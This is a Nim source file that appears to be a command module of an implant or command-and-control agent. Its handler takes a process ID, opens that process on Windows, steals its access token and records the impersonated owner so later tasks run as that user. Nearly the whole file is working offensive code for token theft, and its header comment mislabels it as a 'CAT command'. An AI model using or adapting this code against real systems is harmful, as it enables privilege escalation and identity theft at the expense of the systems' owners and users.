# This is the source for the CAT command
import ../structs
import ../utils
import ../rth/utils/winapi_wrapper
import ../identityManager
import ../rth/ttps/steal_token
import strutils
import winim/lean
#[
Steal a token from a process
  -> only the PID is the parameter

]#
proc cmd_steal_token*(task: Task): seq[TaskResponse] {.cdecl.} =

  # Configure Output
  var
    status = ""

  DBG("STEAL_TOKEN")
  try:
    let pid = parseInt(task.parameters)

    var pHandle = wOpenProcess(cast[DWORD](PROCESS_QUERY_LIMITED_INFORMATION), false, cast[DWORD](pid))

    # If the process cannot be opened, return an error
    if pHandle == 0:
      return buildReturnData(task.id, "", "error")

    let impOwner = getProcessOwner(pHandle)
    DBG("Impersonating owner: " & impOwner)

    var stolenTokenHandle: HANDLE
    if steal_token(pid, true, outToken=addr stolenTokenHandle):
      setImpersonated(impOwner, stolenTokenHandle) # set the currently impersonated user in the ident. manager
    else:
      status = "error"

  except ValueError:
      return buildReturnData(task.id, "", "error")

  # return the response
  return buildReturnData(task.id, "", status)

